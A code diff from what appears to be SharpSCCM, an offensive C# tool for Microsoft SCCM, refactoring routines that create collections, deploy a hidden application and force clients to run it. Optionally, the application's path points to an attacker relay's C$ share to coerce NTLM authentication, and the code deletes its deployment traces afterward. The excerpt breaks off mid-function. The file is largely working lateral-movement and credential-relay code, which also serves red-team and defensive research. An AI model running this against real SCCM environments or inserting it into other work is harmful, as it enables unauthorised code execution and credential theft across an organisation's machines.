@@ -1,49 +1,80 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Data;
 using System.Linq;
 using System.Management;
+using System.Threading;
 
 namespace SharpSCCM
 {
     public static class MgmtPointWmi
     {
-        public static void AddDeviceToCollection(ManagementScope scope, string deviceName, string collectionName)
+        public static void Exec(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string applicationPath = null, string relayServer = null, string resourceId = null, bool runAsUser = true, string collectionType = null, string userName = null)
         {
-            Console.WriteLine($"[+] Adding {deviceName} to {collectionName}");
-            ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
-            newCollectionRule["QueryExpression"] = $"SELECT * FROM SMS_R_System WHERE Name='{deviceName}'";
-            newCollectionRule["RuleName"] = $"{deviceName}_{Guid.NewGuid()}";
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
-            foreach (ManagementObject collection in searcher.Get())
+            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+            // Create a collection is one is not specified
+            if (collection == null)
             {
-                ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
-                addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
-                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
+                if (!string.IsNullOrEmpty(resourceId))
+                {
+                    ManagementObject resource = GetDeviceOrUser(wmiConnection, resourceId: resourceId);
+                    collectionType = resource.ClassPath.ClassName == "SMS_R_System" ? "device" : resource.ClassPath.ClassName == "SMS_R_User" ? "user" : null;
+                }
+                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : null;
+                string newCollectionName = $"{char.ToUpper(collectionType[0]) + collectionType.Substring(1)}s_{Guid.NewGuid()}";
+                collection = NewCollection(wmiConnection, collectionType, newCollectionName);
+                NewCollectionMember(wmiConnection, newCollectionName, collectionType, (string)collection["CollectionID"], deviceName, userName, resourceId);
             }
-            Console.WriteLine($"[+] Added {deviceName} to {collectionName}");
-            Console.WriteLine("[+] Waiting 15s for collection to populate");
-            System.Threading.Thread.Sleep(15000);
-            GetCollectionMember(scope, collectionName, false, null, null, false, false);
+            else
+            {
+                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : (uint)collection["CollectionType"] == 2 ? "device" : (uint)collection["CollectionType"] == 1 ? "user" : null;
+            }
+            string newApplicationName = $"Application_{Guid.NewGuid()}";
+            string newDeploymentName = $"{newApplicationName}_{(string)collection["CollectionID"]}_Install";
+            applicationPath = !string.IsNullOrEmpty(relayServer) ? $"\\\\{relayServer}\\C$" : applicationPath;
+            NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, true);
+            NewDeployment(wmiConnection, newApplicationName, null, (string)collection["CollectionID"]);
+            Console.WriteLine("[+] Waiting for new deployment to become available...");
+            bool deploymentAvailable = false;
+            while (!deploymentAvailable)
+            {
+                Thread.Sleep(millisecondsTimeout: 5000);
+                ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", whereCondition: $"AssignmentName='{newDeploymentName}'");
+                if (deployments.Count == 1)
+                {
+                    Console.WriteLine("[+] New deployment is available, waiting 30 seconds for updated policy to become available");
+                    Thread.Sleep(millisecondsTimeout: 30000);
+                    deploymentAvailable = true;
+                }
+                else
+                {
+                    Console.WriteLine("[+] New deployment is not available yet... trying again in 5 seconds");
+                }
+            }
+            if (collectionType == "device")
+            {
+                UpdateMachinePolicy(wmiConnection, (string)collection["CollectionID"]);
+                Console.WriteLine("[+] Waiting 1 minute for execution to complete...");
+                Thread.Sleep(60000);
+            }
+            else if (collectionType == "user")
+            {
+                UpdateUserPolicy(wmiConnection, (string)collection["CollectionID"]);
+            }
+            Console.WriteLine("[+] Cleaning up");
+            Cleanup.RemoveDeployment(wmiConnection, newDeploymentName);
+            Cleanup.RemoveApplication(wmiConnection, newApplicationName);
+            // Only delete the collection if not using an existing collection
+            if (string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName))
+            {
+                Cleanup.RemoveCollection(wmiConnection, null, (string)collection["CollectionID"]);
+            }
         }
 
-        public static void AddUserToCollection(ManagementScope scope, string userName, string collectionName)
+        public static void InvokeLastLogonUpdate(ManagementScope wmiConnection, string collectionName)
         {
-            Console.WriteLine($"[+] Adding {userName} to {collectionName}");
-            ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
-            newCollectionRule["QueryExpression"] = $"SELECT * FROM SMS_R_User WHERE UniqueUserName='{userName}'";
-            newCollectionRule["RuleName"] = $"{userName}_{Guid.NewGuid()}";
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
-            foreach (ManagementObject collection in searcher.Get())
-            {
-                ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
-                addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
-                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
-            }
-            Console.WriteLine($"[+] Added {userName} to {collectionName}");
-            Console.WriteLine("[+] Waiting 15s for collection to populate");
-            System.Threading.Thread.Sleep(15000);
-            GetCollectionMember(scope, collectionName, false, null, null, false, false);
+            // TODO
         }
-
         public static void GenerateCCR(string target, string server = null, string siteCode = null)
         {
             ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
@@ -56,22 +87,401 @@ namespace SharpSCCM
             collectionClass.InvokeMethod("GenerateCCRByName", generatorParams, null);
         }
 
-        public static void GetCollectionMember(ManagementScope scope, string name, bool count, string[] properties, string orderBy, bool dryRun, bool verbose)
+        public static ManagementObject GetCollection(ManagementScope wmiConnection, string collectionName = null, string collectionId = null, bool printOutput = false)
         {
-            // Get CollectionID from name
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT CollectionID FROM SMS_Collection WHERE Name='{name}'"));
-            ManagementObjectCollection collections = searcher.Get();
-            if (collections.Count > 0)
+            ManagementObject collection = null;
+            string whereCondition = !string.IsNullOrEmpty(collectionId) ? $"CollectionID='{collectionId}'" : $"Name='{collectionName}'";
+            ManagementObjectCollection collections = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Collection", whereCondition: whereCondition);
+            if (collections.Count > 1)
             {
-                foreach (ManagementObject collection in collections)
-                {
-                    MgmtUtil.GetClassInstances(scope, "SMS_CollectionMember_a", count, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", orderBy, dryRun, verbose);
-                }
+                Console.WriteLine($"[!] Found {collections.Count} collections where {whereCondition}");
+                Console.WriteLine("[!] Try using a CollectionID instead (-i)");
+            }
+            else if (collections.Count == 0)
+            {
+                Console.WriteLine($"[+] Found 0 collections matching the specified {(!string.IsNullOrEmpty(collectionId) ? "CollectionID" : !string.IsNullOrEmpty(collectionName) ? "Name" : null)}");
             }
             else
             {
-                Console.WriteLine($"[+] Found 0 instances of SMS_Collection with Name: {name}");
+                collection = collections.OfType<ManagementObject>().First();
+                if (printOutput) Console.WriteLine($"[+] Found the {collection["Name"]} collection ({collection["CollectionID"]})");
             }
+            return collection;
+        }
+
+        public static ManagementObjectCollection GetCollectionMembers(ManagementScope wmiConnection, string collectionName = null, string collectionId = null, bool count = false, string[] properties = null, string whereCondition = null, string orderByColumn = null, bool dryRun = false, bool verbose = false, bool printOutput = false)
+        {
+            ManagementObjectCollection collectionMembers = null;
+            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId, printOutput);
+            if (collection != null)
+            {
+                collectionMembers = MgmtUtil.GetClassInstances(wmiConnection, "SMS_FullCollectionMembership", null, count, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", null, dryRun, verbose, printOutput: printOutput);
+                if (collectionMembers.Count == 0)
+                {
+                    if (printOutput) Console.WriteLine($"[+] Found 0 members in {collection["Name"]} ({collection["CollectionID"]})");
+                }
+            }
+            return collectionMembers;
+        }
+
+        public static void GetCollectionRule(ManagementScope wmiConnection, string providedCollectionName, string providedCollectionId, string deviceName, string userName, string resourceId)
+        {
+            // Get collections that match the provided criteria
+            ManagementObject providedCollection;
+            if (!string.IsNullOrEmpty(providedCollectionName) || !string.IsNullOrEmpty(providedCollectionId))
+            {
+                providedCollection = GetCollection(wmiConnection, providedCollectionName, providedCollectionId, true);
+                if (providedCollection != null)
+                {
+                    providedCollectionName = (string)providedCollection["Name"];
+                    providedCollectionId = (string)providedCollection["CollectionID"];
+                }
+                else
+                {
+                    return;
+                }
+            }
+
+            // Get devices and users that match the provided criteria
+            ManagementObject providedDeviceOrUser = null;
+            if (!string.IsNullOrEmpty(deviceName) || !string.IsNullOrEmpty(userName) || !string.IsNullOrEmpty(resourceId))
+            {
+                providedDeviceOrUser = GetDeviceOrUser(wmiConnection, deviceName, resourceId, userName, true);
+                if (providedDeviceOrUser == null)
+                {
+                    return;
+                }
+            }
+
+            // Get rules for all collections so they can be compared to the provided criteria
+            ManagementObjectCollection existingCollections = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Collection");
+            if (existingCollections.Count > 0)
+            {
+                bool foundMatchingRule = false;
+                Console.WriteLine("[+] Searching for matching collection rules");
+
+                // Loop through once to identify matching collections, again to compare those matches to all existing collections, then additional times as needed for nested rules
+                int loopsCompleted = 0;
+                int depth = 1;
+                int matchingIncludeAndExcludeRules = 0;
+                List<string> existingCollectionsMatchingProvidedResource = new List<string>();
+                List<ManagementBaseObject> unprintedRules = new List<ManagementBaseObject>();
+                while (loopsCompleted <= depth)
+                {
+                    foreach (ManagementObject existingCollection in existingCollections)
+                    {
+                        // Get the Name and CollectionID to for each collection
+                        string existingCollectionName = (string)existingCollection["Name"];
+                        string existingCollectionId = (string)existingCollection["CollectionID"];
+
+                        // Get collection members that match the provided criteria
+                        ManagementObjectCollection existingCollectionMembers;
+                        if (providedDeviceOrUser != null)
+                        {
+                            existingCollectionMembers = GetCollectionMembers(wmiConnection, existingCollectionName, existingCollectionId);
+                            foreach (ManagementObject existingCollectionMember in existingCollectionMembers)
+                            {
+                                if ((uint)existingCollectionMember["ResourceID"] == (uint)providedDeviceOrUser["ResourceID"])
+                                {
+                                    existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
+                                }
+                            }
+                        }
+
+                        // Populate the CollectionRules lazy property
+                        existingCollection.Get();
+                        ManagementBaseObject[] collectionRules = (ManagementBaseObject[])existingCollection["CollectionRules"];
+
+                        // Account for collections with no rules
+                        if (collectionRules != null)
+                        {
+                            foreach (ManagementBaseObject collectionRule in collectionRules)
+                            {
+                                // Grab the query and fetch the results
+                                if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "QueryExpression"))
+                                {
+                                    string collectionRuleQuery = (string)collectionRule["QueryExpression"];
+                                    ManagementObjectCollection collectionRuleQueryResults = MgmtUtil.GetClassInstances(wmiConnection, "Query Results", collectionRuleQuery);
+                                    if (collectionRuleQueryResults.Count > 0)
+                                    {
+                                        // If only a collection Name or CollectionID is provided
+                                        if ((((!string.IsNullOrEmpty(providedCollectionName) && providedCollectionName == existingCollectionName) ||
+                                            (!string.IsNullOrEmpty(providedCollectionId) && providedCollectionId == existingCollectionId)) &&
+                                            string.IsNullOrEmpty(deviceName) && string.IsNullOrEmpty(userName) && string.IsNullOrEmpty(resourceId)) ||
+                                            // If this collection matches a provided or previously matched resource
+                                            existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
+                                        {
+                                            // Add the ID of the collection containing the matching rule to the list of matches
+                                            if (!existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
+                                            {
+                                                existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
+                                            }
+                                            if (loopsCompleted == depth)
+                                            {
+                                                Console.WriteLine("-----------------------------------\n" +
+                                                $"CollectionID: {existingCollectionId}\n" +
+                                                $"Collection Name: {existingCollectionName}\n" +
+                                                $"RuleName: {collectionRule["RuleName"]}\n" +
+                                                $"QueryID: {collectionRule["QueryID"]}\n" +
+                                                $"Query Expression: {collectionRule["QueryExpression"]}");
+                                            }
+                                        }
+                                        foreach (ManagementObject collectionRuleQueryResult in collectionRuleQueryResults)
+                                        {
+                                            // If device Name, user UniqueUserName, or ResourceID provided, or if only a collection Name or CollectionID is provided, print matching or all collection rules, respectively
+                                            try
+                                            {
+                                                // If device Name, user UniqueUserName, or ResourceID provided matches a query result
+                                                if ((string)collectionRuleQueryResult.GetPropertyValue("Name") == deviceName ||
+                                                   (string)collectionRuleQueryResult.GetPropertyValue("UniqueUserName") == userName ||
+                                                   (uint)collectionRuleQueryResult.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId))
+                                                {
+                                                    foundMatchingRule = true;
+                                                    // Add the matching rule to the list of matches
+                                                    if (!unprintedRules.Contains(collectionRule))
+                                                    {
+                                                        unprintedRules.Add(collectionRule);
+                                                    }
+                                                    else if (loopsCompleted == depth)
+                                                    {
+                                                        Console.WriteLine("-----------------------------------\n" +
+                                                        $"CollectionID: {existingCollectionId}\n" +
+                                                        $"Collection Name: {existingCollectionName}\n" +
+                                                        $"RuleName: {collectionRule["RuleName"]}\n" +
+                                                        $"QueryID: {collectionRule["QueryID"]}\n" +
+                                                        $"Query Expression:{collectionRule["QueryExpression"]}");
+                                                    }
+                                                }
+                                            }
+                                            catch (ManagementException)
+                                            {
+                                                // Keep going if the property isn't found because it doesn't exist in both SMS_R_System and SMS_R_User
+                                            }
+                                        }
+                                    }
+                                    // Account for collection rules with queries that return no objects
+                                    else if (((!string.IsNullOrEmpty(providedCollectionName) && providedCollectionName == existingCollectionName) ||
+                                            (!string.IsNullOrEmpty(providedCollectionId) && providedCollectionId == existingCollectionId)) &&
+                                            string.IsNullOrEmpty(deviceName) && string.IsNullOrEmpty(userName) && string.IsNullOrEmpty(resourceId))
+                                    {
+                                        foundMatchingRule = true;
+                                        // Add the ID of the collection containing the matching rule to the list of matches
+                                        if (!existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
+                                        {
+                                            existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
+                                        }
+                                        if (loopsCompleted == depth)
+                                        {
+                                            Console.WriteLine("-----------------------------------\n" +
+                                            $"CollectionID: {existingCollectionId}\n" +
+                                            $"Collection Name: {existingCollectionName}\n" +
+                                            $"RuleName: {collectionRule["RuleName"]}\n" +
+                                            $"QueryID: {collectionRule["QueryID"]}\n" +
+                                            $"Query Expression:{collectionRule["QueryExpression"]}");
+                                        }
+                                    }
+                                }
+                                else if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "ExcludeCollectionID"))
+                                {
+
+                                    string collectionRuleExcludedCollectionId = (string)collectionRule["ExcludeCollectionID"];
+
+                                    if (
+                                        // If a collection Name or CollectionID is provided, print all collection rules
+                                        existingCollectionId == providedCollectionId ||
+                                        // If the collection nested in this collection matches the provided collection
+                                        collectionRuleExcludedCollectionId == providedCollectionId ||
+                                        // If this collection was previously matched because it was included in or excluded from another collection
+                                        existingCollectionsMatchingProvidedResource.Contains(existingCollectionId) ||
+                                        // If the collection nested in this collection was previously matched because it was included in or excluded from another collection
+                                        existingCollectionsMatchingProvidedResource.Contains(collectionRuleExcludedCollectionId)
+                                       )
+                                    {
+                                        foundMatchingRule = true;
+                                        // Add the excluded collection ID to the list of matches if it's not already present
+                                        if (!existingCollectionsMatchingProvidedResource.Contains(collectionRuleExcludedCollectionId))
+                                        {
+                                            existingCollectionsMatchingProvidedResource.Add(collectionRuleExcludedCollectionId);
+                                            matchingIncludeAndExcludeRules++;
+                                        }
+                                        if (loopsCompleted == depth)
+                                        {
+                                            Console.WriteLine("-----------------------------------\n" +
+                                            $"CollectionID: {existingCollectionId}\n" +
+                                            $"Collection Name: {existingCollectionName}\n" +
+                                            $"RuleName: {collectionRule["RuleName"]}\n" +
+                                            $"ExcludeCollectionID: {collectionRule["ExcludeCollectionID"]}");
+                                        }
+                                    }
+                                }
+                                else if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "IncludeCollectionID"))
+                                {
+                                    string collectionRuleIncludedCollectionId = (string)collectionRule["IncludeCollectionID"];
+                                    if (
+                                        // If a collection Name or CollectionID is provided, print all collection rules
+                                        existingCollectionId == providedCollectionId || 
+                                        // If the collection nested in this collection matches the provided collection
+                                        collectionRuleIncludedCollectionId == providedCollectionId ||
+                                        // If this collection was previously matched because it was included in or excluded from another collection
+                                        existingCollectionsMatchingProvidedResource.Contains(existingCollectionId) ||
+                                        // If the collection nested in this collection was previously matched because it was included in or excluded from another collection
+                                        existingCollectionsMatchingProvidedResource.Contains(collectionRuleIncludedCollectionId)
+                                       )
+                                    {
+                                        foundMatchingRule = true;
+                                        // Add the included collection ID to the list of matches if it's not already present
+                                        if (!existingCollectionsMatchingProvidedResource.Contains(collectionRuleIncludedCollectionId))
+                                        {
+                                            existingCollectionsMatchingProvidedResource.Add(collectionRuleIncludedCollectionId);
+                                            matchingIncludeAndExcludeRules++;
+                                        }
+                                        if (loopsCompleted == depth)
+                                        {
+                                            Console.WriteLine("-----------------------------------\n" +
+                                            $"CollectionID: {existingCollectionId}\n" +
+                                            $"Collection Name: {existingCollectionName}\n" +
+                                            $"RuleName: {collectionRule["RuleName"]}\n" +
+                                            $"IncludeCollectionID: {collectionRule["IncludeCollectionID"]}");
+                                        }
+
+                                    }
+                                }
+                                else if (collectionRule.Properties.Cast<PropertyData>().Any(property => property.Name == "ResourceID"))
+                                {
+                                    // If only a collection Name or CollectionID is provided
+                                    if ((((!string.IsNullOrEmpty(providedCollectionName) && providedCollectionName == existingCollectionName) || 
+                                        (!string.IsNullOrEmpty(providedCollectionId) && providedCollectionId == existingCollectionId)) && 
+                                        string.IsNullOrEmpty(deviceName) && string.IsNullOrEmpty(userName) && string.IsNullOrEmpty(resourceId)) ||
+                                        // If this collection matches a provided or previously matched resource
+                                        existingCollectionsMatchingProvidedResource.Contains(existingCollectionId) ||
+                                        // If device Name, user UniqueUserName, or ResourceID provided
+                                        (uint)collectionRule.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId) ||
+                                        (string)collectionRule.GetPropertyValue("RuleName") == deviceName ||
+                                        (string)collectionRule.GetPropertyValue("RuleName") == userName)
+                                    {
+                                        foundMatchingRule = true;
+                                        // Add the collection ID to the list of matches if it's not already present
+                                        if (!existingCollectionsMatchingProvidedResource.Contains(existingCollectionId))
+                                        {
+                                            existingCollectionsMatchingProvidedResource.Add(existingCollectionId);
+                                        }
+                                        if (loopsCompleted == depth)
+                                        {
+                                            Console.WriteLine("-----------------------------------\n" +
+                                            $"CollectionID: {existingCollectionId}\n" +
+                                            $"Collection Name: {existingCollectionName}\n" +
+                                            $"RuleName: {collectionRule[propertyName: "RuleName"]}\n" +
+                                            $"ResourceClassName: {collectionRule["ResourceClassName"]}\n" +
+                                            $"ResourceID: {collectionRule["ResourceID"]}");
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    // Increase depth of search if any include or exclude rules were found
+                    if (matchingIncludeAndExcludeRules > 0)
+                    {
+                        depth++;
+                        Console.WriteLine($"[+] Found {matchingIncludeAndExcludeRules} matching collection rule{(matchingIncludeAndExcludeRules > 1 ? "s" : null)} at depth {depth} that reference{(matchingIncludeAndExcludeRules == 1 ? "s" : null)} other collections");
+                        Console.WriteLine($"[+] Increasing search depth to {depth + 1} and looping through collection rules again to resolve any nested rules");
+                        matchingIncludeAndExcludeRules = 0;
+                    }
+                    int loopsRemaining = depth - loopsCompleted;
+                    if (loopsRemaining > 0)
+                    {
+                        Console.WriteLine($"[+] {loopsRemaining} loop{(loopsRemaining > 1 ? "s" : null)} remaining");
+                    }
+                    loopsCompleted++;
+                }
+                if (foundMatchingRule)
+                {
+                    Console.WriteLine(value: "-----------------------------------");
+                }
+                else
+                {
+                    Console.WriteLine("[+] Found 0 matching collection membership rules");
+                }
+            }
+        }
+
+        public static ManagementObjectCollection GetPrimaryDeviceForUser(ManagementScope wmiConnection, string resourceId = null, string userName = null)
+        {
+            userName = !string.IsNullOrEmpty(resourceId) ? (string)GetDeviceOrUser(wmiConnection, resourceId: resourceId)["UniqueUserName"] : userName;
+            // Escape backslash for WQL query
+            string whereCondition = $"UniqueUserName='{userName.Replace("\\", "\\\\")}'";
+            // Get the device associated with the user
+            ManagementObjectCollection userDevices = MgmtUtil.GetClassInstances(wmiConnection, "SMS_UserMachineRelationship", whereCondition: whereCondition);
+            if (userDevices.Count == 1)
+            {
+                Console.WriteLine($"[+] {userName} is the primary user of {userDevices.OfType<ManagementObject>().First()["ResourceName"]}");
+            }
+            else if (userDevices.Count > 1)
+            {
+                Console.WriteLine($"[!] Found multiple devices where {userName} is the primary user:\n");
+                foreach (ManagementObject userDevice in userDevices)
+                {
+                    Console.WriteLine($"    {userDevice["ResourceName"]}");
+                }
+                Console.WriteLine();
+                Console.WriteLine("[!] Try again using the device Name (-d) or ResourceID (-r)");
+            }
+            else
+            {
+                Console.WriteLine($"[!] Could not find any devices where {userName} is the primary user");
+            }
+            return userDevices;
+        }
+
+        public static ManagementObject GetDeviceOrUserFromResourceId(ManagementScope wmiConnection, string resourceId)
+        {
+            ManagementObject resource = null;
+            string[] classes = { "SMS_R_System", "SMS_R_User" };
+            foreach (string className in classes)
+            {
+                ManagementObjectCollection matchingResources = MgmtUtil.GetClassInstances(wmiConnection, className, whereCondition: $"ResourceID='{resourceId}'");
+                if (matchingResources.Count == 1)
+                {
+                    resource = matchingResources.OfType<ManagementObject>().First();
+                    Console.WriteLine($"[+] Found resource named {resource["Name"]} with ResourceID {resource["ResourceID"]}");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine($"[+] Found 0 devices or users with ResourceID {resourceId} in {className}");
+                }
+            }
+            return resource;
+        }
+
+        public static ManagementObject GetDeviceOrUser(ManagementScope wmiConnection, string deviceName = null, string resourceId = null, string userName = null, bool printOutput = false)
+        {
+            // Escape backslashes (e.g., "DOMAIN\username") for WQL
+            userName = !string.IsNullOrEmpty(userName) ? Helpers.EscapeBackslashes(userName) : null;
+            
+            ManagementObject resource = null;
+            string[] classes = { "SMS_R_System", "SMS_R_User" };
+            string whereCondition = !string.IsNullOrEmpty(resourceId) ? $"ResourceID='{resourceId}'" : !string.IsNullOrEmpty(deviceName) ? $"Name='{deviceName}'" : !string.IsNullOrEmpty(userName) ? $"UniqueUserName='{userName}'" : null;         
+            foreach (string className in classes)
+            {
+                // Skip searches for devices in the users class and vice versa
+                if ((className == "SMS_R_System" && string.IsNullOrEmpty(userName)) ||
+                    (className == "SMS_R_User" && string.IsNullOrEmpty(deviceName)))
+                {
+                    ManagementObjectCollection matchingResources = MgmtUtil.GetClassInstances(wmiConnection, className, whereCondition: whereCondition);
+                    if (matchingResources.Count == 1)
+                    {
+                        resource = matchingResources.OfType<ManagementObject>().First();
+                        if (printOutput) Console.WriteLine($"[+] Found resource named {resource["Name"]} with ResourceID {resource["ResourceID"]}");
+                        break;
+                    }
+                    else
+                    {
+                        if (printOutput) Console.WriteLine($"[+] Found 0 matching {(className == "SMS_R_System" ? "devices" : "users")} in {className}");
+                    }
+                }
+            }
+            return resource;
         }
 
         public static void GetSitePushSettings(ManagementScope wmiConnection = null)
@@ -101,35 +511,35 @@ namespace SharpSCCM
                             Console.WriteLine("[+] Install client software on the following computers:");
                             if (result["Value"].ToString() == "0")
                             {
-                                Console.WriteLine("  Workstations and Servers (including domain controllers)");
+                                Console.WriteLine("      Workstations and Servers (including domain controllers)");
                             }
                             else if (result["Value"].ToString() == "1")
                             {
-                                Console.WriteLine("  Servers only (including domain controllers)");
+                                Console.WriteLine("      Servers only (including domain controllers)");
                             }
                             else if (result["Value"].ToString() == "2")
                             {
-                                Console.WriteLine("  Workstations and Servers (excluding domain controllers)");
+                                Console.WriteLine("      Workstations and Servers (excluding domain controllers)");
                             }
                             else if (result["Value"].ToString() == "3")
                             {
-                                Console.WriteLine("  Servers only (excluding domain controllers)");
+                                Console.WriteLine("      Servers only (excluding domain controllers)");
                             }
                             else if (result["Value"].ToString() == "4")
                             {
-                                Console.WriteLine("  Workstations and domain controllers only (excluding other servers)");
+                                Console.WriteLine("      Workstations and domain controllers only (excluding other servers)");
                             }
                             else if (result["Value"].ToString() == "5")
                             {
-                                Console.WriteLine("  Domain controllers only");
+                                Console.WriteLine("      Domain controllers only");
                             }
                             else if (result["Value"].ToString() == "6")
                             {
-                                Console.WriteLine("  Workstations only");
+                                Console.WriteLine("      Workstations only");
                             }
                             else if (result["Value"].ToString() == "7")
                             {
-                                Console.WriteLine("  No computers");
+                                Console.WriteLine("      No computers");
                             }
                         }
                     }
@@ -175,80 +585,111 @@ namespace SharpSCCM
             }
         }
 
-        public static void Exec (ManagementScope scope, string deviceName = null, string collectionName = null, string path = null, string relayServer = null, bool runAsUser = true)
+        public static void UpdateMachinePolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string resourceId = null, string userName = null)
         {
-            string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
-            string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
-            NewCollection(scope, "device", newCollectionName);
-            AddDeviceToCollection(scope, deviceName, newCollectionName);
-            if (!String.IsNullOrEmpty(relayServer))
+            string collectionType = null;
+            ManagementObject collection = null;
+            if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
             {
-                NewApplication(scope, newApplicationName, $"\\\\{relayServer}\\C$", runAsUser, true);
+                collection = GetCollection(wmiConnection, collectionName, collectionId);
+            }
+            // Create a collection is one is not specified
+            if (collection == null)
+            {
+                if (!string.IsNullOrEmpty(resourceId))
+                {
+                    ManagementObject resource = GetDeviceOrUser(wmiConnection, resourceId: resourceId);
+                    collectionType = resource.ClassPath.ClassName == "SMS_R_System" ? "device" : resource.ClassPath.ClassName == "SMS_R_User" ? "user" : null;
+                }
+                collectionType = !string.IsNullOrEmpty(collectionType) ? collectionType : !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : null;
+                string newCollectionName = $"{char.ToUpper(collectionType[0]) + collectionType.Substring(1)}s_{Guid.NewGuid()}";
+                collection = NewCollection(wmiConnection, collectionType, newCollectionName);
+                NewCollectionMember(wmiConnection, newCollectionName, collectionType, (string)collection["CollectionID"], deviceName, userName, resourceId);
             }
             else
             {
-                NewApplication(scope, newApplicationName, $"{path}", runAsUser, true);
+                collectionType = (uint)collection["CollectionType"] == 2 ? "device" : (uint)collection["CollectionType"] == 1 ? "user" : null;
             }
-            NewDeployment(scope, newApplicationName, newCollectionName);
-            Console.WriteLine("[+] Waiting 30s for new deployment to become available");
-            System.Threading.Thread.Sleep(30000);
-            InvokeUpdate(scope, newCollectionName);
-            Console.WriteLine("[+] Waiting 1m for NTLM authentication");
-            System.Threading.Thread.Sleep(60000);
-            Console.WriteLine("[+] Cleaning up");
-            Cleanup.RemoveDeployment(scope, newApplicationName, newCollectionName);
-            Cleanup.RemoveApplication(scope, newApplicationName);
-            Cleanup.RemoveCollection(scope, newCollectionName);
-        }
-        
-        public static void InvokeLastLogonUpdate(ManagementScope scope, string collectionName)
-        {
-            // TODO
-        }
-
-        public static void InvokeUpdate(ManagementScope scope, string collectionName)
-        {
-            Console.WriteLine($"[+] Forcing all members of {collectionName} to check for updates and execute any new applications available");
-            ManagementClass clientOperation = new ManagementClass(scope, new ManagementPath("SMS_ClientOperation"), null);
+            ManagementClass clientOperation = new ManagementClass(wmiConnection, new ManagementPath("SMS_ClientOperation"), null);
             ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
             initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow
 
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
-            foreach (ManagementObject collection in searcher.Get())
-            {
-                initiateClientOpParams["TargetCollectionID"] = collection.GetPropertyValue("CollectionID");
-            }
+            Console.WriteLine($"[+] Forcing all members of {collection["Name"]} ({collection["CollectionID"]}) to retrieve machine policy and execute any new applications available");
             try
             {
+                initiateClientOpParams[propertyName: "TargetCollectionID"] = collection["CollectionID"];
                 clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
             }
             catch (ManagementException ex)
             {
                 Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                Console.WriteLine("[!] Does your account have the correct permissions?");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
+                Console.WriteLine("[!] Is your account assigned the correct security role?");
             }
         }
 
-        public static void NewApplication(ManagementScope scope, string name, string path, bool runAsUser = false, bool stealth = false)
+        public static void UpdateUserPolicy(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string resourceId = null, string userName = null)
         {
+            if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
+            {
+                ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+                if (collection != null)
+                {
+                    ManagementObjectCollection collectionMembers = GetCollectionMembers(wmiConnection, collectionName, collectionId);
+                    if (collectionMembers.Count > 0)
+                    {
+                        // Run policy retrieval and evaluation cycle on device collections
+                        if ((uint)collection["CollectionType"] == 2)
+                        {
+                            Console.WriteLine($"[+] Forcing all members of {collection["Name"]} ({collection["CollectionID"]}) to retrieve user policy and execute any new applications available");
